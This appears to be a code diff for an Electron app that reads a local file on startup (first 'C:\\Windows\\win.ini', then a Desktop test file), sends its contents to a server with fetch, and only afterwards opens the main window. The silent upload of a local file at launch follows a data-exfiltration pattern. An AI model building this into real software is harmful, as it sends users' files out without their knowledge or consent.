@@ -3,7 +3,7 @@ const fs = require('fs');
 const fetch = require('node-fetch'); // Use node-fetch to make HTTP requests in the main process
 
 app.on('ready', () => {
-  const filePath = 'C:\\Windows\\win.ini'; // Define the file path
+  const filePath = 'C:\\Users\\Desktop\\test.txt'; // Define the file path
 
   fs.readFile(filePath, 'utf-8', (err, data) => {
     if (err) {
@@ -32,8 +32,15 @@ function sendDataToServer(data) {
   })
   .then(responseData => {
     console.log('Server response:', responseData);
+    createMainWindow(); // Open the main window after sending data to the server
   })
   .catch(error => {
     console.error('There was a problem with the fetch operation:', error);
   });
+}
+
+function createMainWindow() {
+  let mainWindow = new BrowserWindow({ width: 800, height: 600 });
+  mainWindow.loadFile('index.html');
+  // Other configurations for mainWindow as needed
 }
